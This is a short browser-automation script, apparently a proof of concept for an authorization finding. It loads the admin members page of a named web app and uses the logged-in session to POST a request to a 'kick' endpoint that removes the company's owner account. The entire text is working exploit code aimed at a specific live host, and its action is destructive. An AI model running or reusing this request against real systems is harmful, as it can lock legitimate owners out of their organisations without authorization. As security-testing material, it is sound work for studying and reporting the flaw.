export default async ({ page }) => {
  await page.goto('https://airion-cargo.store/w/W4QDF1XTURESO01/settings/admin/members', { waitUntil:'networkidle' });
  await page.waitForTimeout(2200);
  return await page.evaluate(async () => {
    const CO='O4QDF1XTURESO01', OWNER='U4QDOWNER000001', BOB='U4QDBOB00000001';
    const call=async b=>{const r=await fetch('/api/v1/companies/kick',{method:'POST',credentials:'include',
      headers:{'Content-Type':'application/json'},body:JSON.stringify(b)});
      return {sent:JSON.stringify(b), s:r.status, b:(await r.text()).slice(0,200)};};
    // ONLY the owner — the one the finding is about. Never a removable member.
    return { owner: await call({company_id:CO, user_id:OWNER}) };
  });
};
